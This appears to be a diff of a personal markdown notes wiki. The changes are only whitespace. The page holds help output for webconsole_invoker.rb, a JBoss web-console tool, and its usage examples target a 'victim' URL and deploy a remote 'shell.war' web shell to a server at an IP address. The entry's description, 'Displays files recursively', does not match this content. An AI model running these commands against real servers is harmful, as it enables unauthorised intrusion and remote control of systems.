@@ -2,13 +2,15 @@ My Wiki
 - - - - - - 
 * Notes to myself, all writen in clear MarkDown ;)
 
+----------------------------
+
+
 ## command
 ### Argument example
  * **Command with arguments**: `command --help`
  * **Description**: Displays files recursively~
  * **Output**:
    * <div class="slide" style="cursor: pointer;"> **OS:** Show/Hide</div><div class="view"><code>command --help
-   * 
                 % jruby ./webconsole_invoker.rb -h 2>/dev/null
                 Usage: ./webconsole_invoker.rb [options] MBean
                 
@@ -27,10 +29,7 @@ My Wiki
                 
                 ./webconsole_invoker.rb -c --url http://victim/web-console/Invoker
                 ./webconsole_invoker.rb -m http://remote/shell.war --url http://85.115.22.239:8180/web-console/Invoker
-
     </code></div>
-
-
 
 
 
